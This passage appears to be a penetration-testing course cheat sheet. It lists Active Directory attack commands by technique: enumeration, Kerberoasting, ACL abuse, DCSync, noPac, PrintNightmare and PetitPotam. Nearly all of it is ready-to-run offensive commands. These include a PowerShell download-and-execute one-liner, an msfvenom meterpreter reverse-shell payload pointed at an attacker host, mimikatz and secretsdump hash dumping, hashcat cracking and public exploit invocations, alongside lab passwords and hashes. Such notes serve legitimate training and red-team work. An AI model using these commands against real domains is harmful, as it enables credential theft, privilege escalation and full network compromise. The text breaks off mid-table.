id=enumeration-by-living-off-the-land>Enumeration by Living Off the Land<a class=headerlink href=#enumeration-by-living-off-the-land title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>Get-Module</code></td> <td>PowerShell cmd-let used to list all available modules, their version and command options from a Windows-based host.</td> </tr> <tr> <td><code>Import-Module ActiveDirectory</code></td> <td>Loads the <code>Active Directory</code> PowerShell module from a Windows-based host.</td> </tr> <tr> <td><code>Get-ADDomain</code></td> <td>PowerShell cmd-let used to gather Windows domain information from a Windows-based host.</td> </tr> <tr> <td><code>Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName</code></td> <td>PowerShell cmd-let used to enumerate user accounts on a target Windows domain and filter by <code>ServicePrincipalName</code>. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-ADTrust -Filter *</code></td> <td>PowerShell cmd-let used to enumerate any trust relationships in a target Windows domain and filters by any (<code>-Filter *</code>). Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-ADGroup -Filter * \| select name</code></td> <td>PowerShell cmd-let used to enumerate groups in a target Windows domain and filters by the name of the group (<code>select name</code>). Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-ADGroup -Identity "Backup Operators"</code></td> <td>PowerShell cmd-let used to search for a specifc group (<code>-Identity "Backup Operators"</code>). Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-ADGroupMember -Identity "Backup Operators"</code></td> <td>PowerShell cmd-let used to discover the members of a specific group (<code>-Identity "Backup Operators"</code>). Performed from a Windows-based host.</td> </tr> <tr> <td><code>Export-PowerViewCSV</code></td> <td>PowerView script used to append results to a <code>CSV</code> file. Performed from a Windows-based host.</td> </tr> <tr> <td><code>ConvertTo-SID</code></td> <td>PowerView script used to convert a <code>User</code> or <code>Group</code> name to it's <code>SID</code>. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainSPNTicket</code></td> <td>PowerView script used to request the kerberos ticket for a specified service principal name (<code>SPN</code>). Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-Domain</code></td> <td>PowerView script used tol return the AD object for the current (or specified) domain. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainController</code></td> <td>PowerView script used to return a list of the target domain controllers for the specified target domain. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainUser</code></td> <td>PowerView script used to return all users or specific user objects in AD. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainComputer</code></td> <td>PowerView script used to return all computers or specific computer objects in AD. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainGroup</code></td> <td>PowerView script used to eturn all groups or specific group objects in AD. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainOU</code></td> <td>PowerView script used to search for all or specific OU objects in AD. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Find-InterestingDomainAcl</code></td> <td>PowerView script used to find object <code>ACLs</code> in the domain with modification rights set to non-built in objects. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainGroupMember</code></td> <td>PowerView script used to return the members of a specific domain group. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainFileServer</code></td> <td>PowerView script used to return a list of servers likely functioning as file servers. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainDFSShare</code></td> <td>PowerView script used to return a list of all distributed file systems for the current (or specified) domain. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainGPO</code></td> <td>PowerView script used to return all GPOs or specific GPO objects in AD. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainPolicy</code></td> <td>PowerView script used to return the default domain policy or the domain controller policy for the current domain. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-NetLocalGroup</code></td> <td>PowerView script used to enumerate local groups on a local or remote machine. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-NetLocalGroupMember</code></td> <td>PowerView script enumerate members of a specific local group. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-NetShare</code></td> <td>PowerView script used to return a list of open shares on a local (or a remote) machine. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-NetSession</code></td> <td>PowerView script used to return session information for the local (or a remote) machine. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Test-AdminAccess</code></td> <td>PowerView script used to test if the current user has administrative access to the local (or a remote) machine. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Find-DomainUserLocation</code></td> <td>PowerView script used to find machines where specific users are logged into. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Find-DomainShare</code></td> <td>PowerView script used to find reachable shares on domain machines. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Find-InterestingDomainShareFile</code></td> <td>PowerView script that searches for files matching specific criteria on readable shares in the domain. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Find-LocalAdminAccess</code></td> <td>PowerView script used to find machines on the local domain where the current user has local administrator access Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainTrust</code></td> <td>PowerView script that returns domain trusts for the current domain or a specified domain. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-ForestTrust</code></td> <td>PowerView script that returns all forest trusts for the current forest or a specified forest. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainForeignUser</code></td> <td>PowerView script that enumerates users who are in groups outside of the user's domain. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainForeignGroupMember</code></td> <td>PowerView script that enumerates groups with users outside of the group's domain and returns each foreign member. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainTrustMapping</code></td> <td>PowerView script that enumerates all trusts for current domain and any others seen. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainGroupMember -Identity "Domain Admins" -Recurse</code></td> <td>PowerView script used to list all the members of a target group (<code>"Domain Admins"</code>) through the use of the recurse option (<code>-Recurse</code>). Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName</code></td> <td>PowerView script used to find users on the target Windows domain that have the <code>Service Principal Name</code> set. Performed from a Windows-based host.</td> </tr> <tr> <td><code>.\Snaffler.exe -d legalcorp.local -s -v data</code></td> <td>Runs a tool called <code>Snaffler</code> against a target Windows domain that finds various kinds of data in shares that the compromised account has access to. Performed from a Windows-based host.</td> </tr> </tbody> </table> <h1 id=transfering-files>Transfering Files<a class=headerlink href=#transfering-files title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>sudo python3 -m http.server 8001</code></td> <td>Starts a python web server for quick hosting of files. Performed from a Linux-basd host.</td> </tr> <tr> <td><code>"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"</code></td> <td>PowerShell one-liner used to download a file from a web server. Performed from a Windows-based host.</td> </tr> <tr> <td><code>impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/</code></td> <td>Starts a impacket <code>SMB</code> server for quick hosting of a file. Performed from a Windows-based host.</td> </tr> </tbody> </table> <h1 id=kerberoasting>Kerberoasting<a class=headerlink href=#kerberoasting title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>sudo python3 -m pip install .</code></td> <td>Used to install Impacket from inside the directory that gets cloned to the attack host. Performed from a Linux-based host.</td> </tr> <tr> <td><code>GetUserSPNs.py -h</code></td> <td>Impacket tool used to display the options and functionality of <code>GetUserSPNs.py</code> from a Linux-based host.</td> </tr> <tr> <td><code>GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/mholliday</code></td> <td>Impacket tool used to get a list of <code>SPNs</code> on the target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/mholliday -request</code></td> <td>Impacket tool used to download/request (<code>-request</code>) all TGS tickets for offline processing from a Linux-based host.</td> </tr> <tr> <td><code>GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/mholliday -request-user sqldev</code></td> <td>Impacket tool used to download/request (<code>-request-user</code>) a TGS ticket for a specific user account (<code>sqldev</code>) from a Linux-based host.</td> </tr> <tr> <td><code>GetUserSPNs.py -dc-ip 172.16.5.5 legalcorp.local/mholliday -request-user sqldev -outputfile sqldev_tgs</code></td> <td>Impacket tool used to download/request a TGS ticket for a specific user account and write the ticket to a file (<code>-outputfile sqldev_tgs</code>) linux-based host.</td> </tr> <tr> <td><code>hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --force</code></td> <td>Attempts to crack the Kerberos (<code>-m 13100</code>) ticket hash (<code>sqldev_tgs</code>) using <code>hashcat</code> and a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td> </tr> <tr> <td><code>setspn.exe -Q */*</code></td> <td>Used to enumerate <code>SPNs</code> in a target Windows domain from a Windows-based host.</td> </tr> <tr> <td><code>Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.legalcorp.local:1433"</code></td> <td>PowerShell script used to download/request the TGS ticket of a specific user from a Windows-based host.</td> </tr> <tr> <td><code>setspn.exe -T legalcorp.local -Q */* \| Select-String '^CN' -Context 0,1 \| % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }</code></td> <td>Used to download/request all TGS tickets from a WIndows-based host.</td> </tr> <tr> <td><code>mimikatz # base64 /out:true</code></td> <td><code>Mimikatz</code> command that ensures TGS tickets are extracted in <code>base64</code> format from a Windows-based host.</td> </tr> <tr> <td><code>kerberos::list /export</code></td> <td><code>Mimikatz</code> command used to extract the TGS tickets from a Windows-based host.</td> </tr> <tr> <td><code>echo "&lt;base64 blob&gt;" \| tr -d \\n</code></td> <td>Used to prepare the base64 formatted TGS ticket for cracking from Linux-based host.</td> </tr> <tr> <td><code>cat encoded_file \| base64 -d &gt; sqldev.kirbi</code></td> <td>Used to output a file (<code>encoded_file</code>) into a .kirbi file in base64 (<code>base64 -d &gt; sqldev.kirbi</code>) format from a Linux-based host.</td> </tr> <tr> <td><code>python2.7 kirbi2john.py sqldev.kirbi</code></td> <td>Used to extract the <code>Kerberos ticket</code>. This also creates a file called <code>crack_file</code> from a Linux-based host.</td> </tr> <tr> <td><code>sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file &gt; sqldev_tgs_hashcat</code></td> <td>Used to modify the <code>crack_file</code> for <code>Hashcat</code> from a Linux-based host.</td> </tr> <tr> <td><code>cat sqldev_tgs_hashcat</code></td> <td>Used to view the prepared hash from a Linux-based host.</td> </tr> <tr> <td><code>hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt</code></td> <td>Used to crack the prepared Kerberos ticket hash (<code>sqldev_tgs_hashcat</code>) using a wordlist (<code>rockyou.txt</code>) from a Linux-based host.</td> </tr> <tr> <td><code>Import-Module .\PowerView.ps1 Get-DomainUser * -spn \| select samaccountname</code></td> <td>Uses PowerView tool to extract <code>TGS Tickets</code> . Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainUser -Identity sqldev \| Get-DomainSPNTicket -Format Hashcat</code></td> <td>PowerView tool used to download/request the TGS ticket of a specific ticket and automatically format it for <code>Hashcat</code> from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainUser * -SPN \| Get-DomainSPNTicket -Format Hashcat \| Export-Csv .\lcorp_tgs.csv -NoTypeInformation</code></td> <td>Exports all TGS tickets to a <code>.CSV</code> file (<code>lcorp_tgs.csv</code>) from a Windows-based host.</td> </tr> <tr> <td><code>cat .\lcorp_tgs.csv</code></td> <td>Used to view the contents of the .csv file from a Windows-based host.</td> </tr> <tr> <td><code>.\Rubeus.exe</code></td> <td>Used to view the options and functionality possible with the tool <code>Rubeus</code>. Performed from a Windows-based host.</td> </tr> <tr> <td><code>.\Rubeus.exe kerberoast /stats</code></td> <td>Used to check the kerberoast stats (<code>/stats</code>) within the target Windows domain from a Windows-based host.</td> </tr> <tr> <td><code>.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap</code></td> <td>Used to request/download TGS tickets for accounts with the <code>admin</code> count set to <code>1</code> then formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>) . Performed from a Windows-based host.</td> </tr> <tr> <td><code>.\Rubeus.exe kerberoast /user:testspn /nowrap</code></td> <td>Used to request/download a TGS ticket for a specific user (<code>/user:testspn</code>) the formats the output in an easy to view &amp; crack manner (<code>/nowrap</code>). Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes</code></td> <td>PowerView tool used to check the <code>msDS-SupportedEncryptionType</code> attribute associated with a specific user account (<code>testspn</code>). Performed from a Windows-based host.</td> </tr> <tr> <td><code>hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt</code></td> <td>Used to attempt to crack the ticket hash using a wordlist (<code>rockyou.txt</code>) from a Linux-based host .</td> </tr> </tbody> </table> <h1 id=acl-enumeration-tactics>ACL Enumeration &amp; Tactics<a class=headerlink href=#acl-enumeration-tactics title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>Find-InterestingDomainAcl</code></td> <td>PowerView tool used to find object ACLs in the target Windows domain with modification rights set to non-built in objects from a Windows-based host.</td> </tr> <tr> <td><code>Import-Module .\PowerView.ps1 $sid = Convert-NameToSid wley</code></td> <td>Used to import PowerView and retrieve the <code>SID</code> of a specific user account (<code>wley</code>) from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainObjectACL -Identity * \| ? {$_.SecurityIdentifier -eq $sid}</code></td> <td>Used to find all Windows domain objects that the user has rights over by mapping the user's <code>SID</code> to the <code>SecurityIdentifier</code> property from a Windows-based host.</td> </tr> <tr> <td><code>$guid= "00299570-246d-11d0-a768-00aa006e0529" Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * \| Select Name,DisplayName,DistinguishedName,rightsGuid \| ?{$_.rightsGuid -eq $guid} \| fl</code></td> <td>Used to perform a reverse search &amp; map to a <code>GUID</code> value from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainObjectACL -ResolveGUIDs -Identity * \| ? {$_.SecurityIdentifier -eq $sid}</code></td> <td>Used to discover a domain object's ACL by performing a search based on GUID's (<code>-ResolveGUIDs</code>) from a Windows-based host.</td> </tr> <tr> <td><code>Get-ADUser -Filter * \| Select-Object -ExpandProperty SamAccountName &gt; ad_users.txt</code></td> <td>Used to discover a group of user accounts in a target Windows domain and add the output to a text file (<code>ad_users.txt</code>) from a Windows-based host.</td> </tr> <tr> <td><code>foreach($line in [System.IO.File]::ReadLines("C:\Users\user\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" \| Select-Object Path -ExpandProperty Access \| Where-Object {$_.IdentityReference -match 'LEGALCORP\\wley'}}</code></td> <td>A <code>foreach loop</code> used to retrieve ACL information for each domain user in a target Windows domain by feeding each list of a text file(<code>ad_users.txt</code>) to the <code>Get-ADUser</code> cmdlet, then enumerates access rights of those users. Performed from a Windows-based host.</td> </tr> <tr> <td><code>$SecPassword = ConvertTo-SecureString '&lt;PASSWORD HERE&gt;' -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential('LEGALCORP\wley', $SecPassword)</code></td> <td>Used to create a <code>PSCredential Object</code> from a Windows-based host.</td> </tr> <tr> <td><code>$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force</code></td> <td>Used to create a <code>SecureString Object</code> from a Windows-based host.</td> </tr> <tr> <td><code>Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose</code></td> <td>PowerView tool used to change the password of a specifc user (<code>damundsen</code>) on a target Windows domain from a Windows-based host.</td> </tr> <tr> <td><code>Get-ADGroup -Identity "Help Desk Level 1" -Properties * \| Select -ExpandProperty Members</code></td> <td>PowerView tool used view the members of a target security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td> </tr> <tr> <td><code>Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose</code></td> <td>PowerView tool used to add a specifc user (<code>damundsen</code>) to a specific security group (<code>Help Desk Level 1</code>) in a target Windows domain from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainGroupMember -Identity "Help Desk Level 1" \| Select MemberName</code></td> <td>PowerView tool used to view the members of a specific security group (<code>Help Desk Level 1</code>) and output only the username of each member (<code>Select MemberName</code>) of the group from a Windows-based host.</td> </tr> <tr> <td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose</code></td> <td>PowerView tool used create a fake <code>Service Principal Name</code> given a sepecift user (<code>adunn</code>) from a Windows-based host.</td> </tr> <tr> <td><code>Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose</code></td> <td>PowerView tool used to remove the fake <code>Service Principal Name</code> created during the attack from a Windows-based host.</td> </tr> <tr> <td><code>Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose</code></td> <td>PowerView tool used to remove a specific user (<code>damundsent</code>) from a specific security group (<code>Help Desk Level 1</code>) from a Windows-based host.</td> </tr> <tr> <td><code>ConvertFrom-SddlString</code></td> <td>PowerShell cmd-let used to covert an <code>SDDL string</code> into a readable format. Performed from a Windows-based host.</td> </tr> </tbody> </table> <h1 id=dcsync>DCSync<a class=headerlink href=#dcsync title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>Get-DomainUser -Identity adunn \| select samaccountname,objectsid,memberof,useraccountcontrol \|fl</code></td> <td>PowerView tool used to view the group membership of a specific user (<code>adunn</code>) in a target Windows domain. Performed from a Windows-based host.</td> </tr> <tr> <td><code>$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164" Get-ObjectAcl "DC=LEGALCORP,DC=local" -ResolveGUIDs \| ? { ($_.ObjectAceType -match 'Replication-Get')} \| ?{$_.SecurityIdentifier -match $sid} \| select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType \| fl</code></td> <td>Used to create a variable called SID that is set equal to the SID of a user account. Then uses PowerView tool <code>Get-ObjectAcl</code> to check a specific user's replication rights. Performed from a Windows-based host.</td> </tr> <tr> <td><code>secretsdump.py -outputfile LEGALCORP_hashes -just-dc LEGALCORP/adunn@172.16.5.5 -use-vss</code></td> <td>Impacket tool sed to extract NTLM hashes from the NTDS.dit file hosted on a target Domain Controller (<code>172.16.5.5</code>) and save the extracted hashes to an file (<code>LEGALCORP_hashes</code>). Performed from a Linux-based host.</td> </tr> <tr> <td><code>mimikatz # lsadump::dcsync /domain:legalcorp.local /user:LEGALCORP\administrator</code></td> <td>Uses <code>Mimikatz</code> to perform a <code>dcsync</code> attack from a Windows-based host.</td> </tr> </tbody> </table> <h1 id=privileged-access>Privileged Access<a class=headerlink href=#privileged-access title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"</code></td> <td>PowerView based tool to used to enumerate the <code>Remote Desktop Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td> </tr> <tr> <td><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"</code></td> <td>PowerView based tool to used to enumerate the <code>Remote Management Users</code> group on a Windows target (<code>-ComputerName ACADEMY-EA-MS01</code>) from a Windows-based host.</td> </tr> <tr> <td><code>$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force</code></td> <td>Creates a variable (<code>$password</code>) set equal to the password (<code>Klmcargo2</code>) of a user from a Windows-based host.</td> </tr> <tr> <td><code>$cred = new-object System.Management.Automation.PSCredential ("LEGALCORP\forend", $password)</code></td> <td>Creates a variable (<code>$cred</code>) set equal to the username (<code>forend</code>) and password (<code>$password</code>) of a target domain account from a Windows-based host.</td> </tr> <tr> <td><code>Enter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred</code></td> <td>Uses the PowerShell cmd-let <code>Enter-PSSession</code> to establish a PowerShell session with a target over the network (<code>-ComputerName ACADEMY-EA-DB01</code>) from a Windows-based host. Authenticates using credentials made in the 2 commands shown prior (<code>$cred</code> &amp; <code>$password</code>).</td> </tr> <tr> <td><code>evil-winrm -i 10.129.201.234 -u forend</code></td> <td>Used to establish a PowerShell session with a Windows target from a Linux-based host using <code>WinRM</code>.</td> </tr> <tr> <td><code>Import-Module .\PowerUpSQL.ps1</code></td> <td>Used to import the <code>PowerUpSQL</code> tool.</td> </tr> <tr> <td><code>Get-SQLInstanceDomain</code></td> <td>PowerUpSQL tool used to enumerate SQL server instances from a Windows-based host.</td> </tr> <tr> <td><code>Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "LEGALCORP\damundsen" -password "SQL1234!" -query 'Select @@version'</code></td> <td>PowerUpSQL tool used to connect to connect to a SQL server and query the version (<code>-query 'Select @@version'</code>) from a Windows-based host.</td> </tr> <tr> <td><code>mssqlclient.py</code></td> <td>Impacket tool used to display the functionality and options provided with <code>mssqlclient.py</code> from a Linux-based host.</td> </tr> <tr> <td><code>mssqlclient.py LEGALCORP/DAMUNDSEN@172.16.5.150 -windows-auth</code></td> <td>Impacket tool used to connect to a MSSQL server from a Linux-based host.</td> </tr> <tr> <td><code>SQL&gt; help</code></td> <td>Used to display mssqlclient.py options once connected to a MSSQL server.</td> </tr> <tr> <td><code>SQL&gt; enable_xp_cmdshell</code></td> <td>Used to enable <code>xp_cmdshell stored procedure</code> that allows for executing OS commands via the database from a Linux-based host.</td> </tr> <tr> <td><code>xp_cmdshell whoami /priv</code></td> <td>Used to enumerate rights on a system using <code>xp_cmdshell</code>.</td> </tr> </tbody> </table> <h1 id=nopac>NoPac<a class=headerlink href=#nopac title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>sudo git clone https://github.com/Ridter/noPac.git</code></td> <td>Used to clone a <code>noPac</code> exploit using git. Performed from a Linux-based host.</td> </tr> <tr> <td><code>sudo python3 scanner.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap</code></td> <td>Runs <code>scanner.py</code> to check if a target system is vulnerable to <code>noPac</code>/<code>Sam_The_Admin</code> from a Linux-based host.</td> </tr> <tr> <td><code>sudo python3 noPac.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</code></td> <td>Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code> vulnerability and gain a SYSTEM shell (<code>-shell</code>). Performed from a Linux-based host.</td> </tr> <tr> <td><code>sudo python3 noPac.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user LEGALCORP/administrator</code></td> <td>Used to exploit the <code>noPac</code>/<code>Sam_The_Admin</code> vulnerability and perform a <code>DCSync</code> attack against the built-in Administrator account on a Domain Controller from a Linux-based host.</td> </tr> </tbody> </table> <h1 id=printnightmare>PrintNightmare<a class=headerlink href=#printnightmare title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>git clone https://github.com/cube0x0/CVE-2021-1675.git</code></td> <td>Used to clone a PrintNightmare exploit using git from a Linux-based host.</td> </tr> <tr> <td><code>pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install</code></td> <td>Used to ensure the exploit author's (<code>cube0x0</code>) version of Impacket is installed. This also uninstalls any previous Impacket version on a Linux-based host.</td> </tr> <tr> <td><code>rpcdump.py @172.16.5.5 \| egrep 'MS-RPRN\|MS-PAR'</code></td> <td>Used to check if a Windows target has <code>MS-PAR</code> &amp; <code>MSRPRN</code> exposed from a Linux-based host.</td> </tr> <tr> <td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll</code></td> <td>Used to generate a DLL payload to be used by the exploit to gain a shell session. Performed from a Windows-based host.</td> </tr> <tr> <td><code>sudo smbserver.py -smb2support CompData /path/to/backupscript.dll</code></td> <td>Used to create an SMB server and host a shared folder (<code>CompData</code>) at the specified location on the local linux host. This can be used to host the DLL payload that the exploit will attempt to download to the host. Performed from a Linux-based host.</td> </tr> <tr> <td><code>sudo python3 CVE-2021-1675.py legalcorp.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'</code></td> <td>Executes the exploit and specifies the location of the DLL payload. Performed from a Linux-based host.</td> </tr> </tbody> </table> <h1 id=petitpotam>PetitPotam<a class=headerlink href=#petitpotam title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.legalcorp.local/certsrv/certfnsh.asp --adcs --template DomainController</code></td> <td>Impacket tool used to create an <code>NTLM relay</code> by specifiying the web enrollment URL for the <code>Certificate Authority</code> host. Perfomred from a Linux-based host.</td> </tr> <tr> <td><code>git clone https://github.com/topotam/PetitPotam.git</code></td> <td>Used to clone the <code>PetitPotam</code> exploit using git. Performed from a Linux-based host.</td> </tr> <tr> <td><code>python3 PetitPotam.py 172.16.5.225 172.16.5.5</code></td> <td>Used to execute the PetitPotam exploit by specifying the IP address of the attack host (<code>172.16.5.255</code>) and the target Domain Controller (<code>172.16.5.5</code>). Performed from a Linux-based host.</td> </tr> <tr> <td><code>python3 /opt/PKINITtools/gettgtpkinit.py legalcorp.local/ACADEMY-EA-DC01\$ -pfx-base64 &lt;base64 certificate&gt; = dc01.ccache</code></td> <td>Uses <code>gettgtpkinit</code>.py to request a TGT ticket for the Domain Controller (<code>dc01.ccache</code>) from a Linux-based host.</td> </tr> <tr> <td><code>secretsdump.py -just-dc-user LEGALCORP/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.legalcorp.local</code></td> <td>Impacket tool used to perform a DCSync attack and retrieve one or all of the <code>NTLM password hashes</code> from the target Windows domain. Performed from a Linux-based host.</td> </tr> <tr> <td><code>klist</code></td> <td><code>krb5-user</code> command used to view the contents of the <code>ccache</code> file. Performed from a Linux-based host.</td> </tr> <tr> <td><code>python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 legalcorp.local/ACADEMY-EA-DC01$</code></td> <td>Used to submit TGS requests using <code>getnthash.py</code> from a Linux-based host.</td> </tr> <tr> <td><code>secretsdump.py -just-dc-user LEGALCORP/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba</code></td> <td>Impacket tool used to extract hashes from <code>NTDS.dit</code> using a <code>DCSync attack</code> and a captured hash (<code>-hashes</code>). Performed from a Linux-based host.</td> </tr> <tr> <td><code>.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /&lt;base64 certificate&gt;=/ptt</code></td> <td>Uses Rubeus to request a TGT and perform a <code>pass-the-ticket attack</code> using the machine account (<code>/user:ACADEMY-EA-DC01$</code>) of a Windows target. Performed from a Windows-based host.</td> </tr> <tr> <td><code>mimikatz # lsadump::dcsync /user:LEGALCORP\krbtgt</code></td> <td>Performs a DCSync attack using <code>Mimikatz</code>. Performed from a Windows-based host.</td> </tr> </tbody> </table> <h1 id=miscellaneous-misconfigurations>Miscellaneous Misconfigurations<a class=headerlink href=#miscellaneous-misconfigurations title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>Import-Module .\SecurityAssessment.ps1</code></td> <td>Used to import the module <code>Security Assessment.ps1</code>. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.legalcorp.local</code></td> <td>SecurityAssessment.ps1 based tool used to enumerate a Windows target for <code>MS-PRN Printer bug</code>. Performed from a Windows-based host.</td> </tr> <tr> <td><code>adidnsdump -u LEGALCORP\\forend ldap://172.16.5.5</code></td> <td>Used to resolve all records in a DNS zone over <code>LDAP</code> from a Linux-based host.</td> </tr> <tr> <td><code>adidnsdump -u LEGALCORP\\forend ldap://172.16.5.5 -r</code></td> <td>Used to resolve unknown records in a DNS zone by performing an <code>A query</code> (<code>-r</code>) from a Linux-based host.</td> </tr> <tr> <td><code>Get-DomainUser * \| Select-Object samaccountname,description</code></td> <td>PowerView tool used to display the description field of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol</code></td> <td>PowerView tool used to check for the <code>PASSWD_NOTREQD</code> setting of select objects (<code>Select-Object</code>) on a target Windows domain from a Windows-based host.</td> </tr> <tr> <td><code>ls \\academy-ea-dc01\SYSVOL\legalcorp.local\scripts</code></td> <td>Used to list the 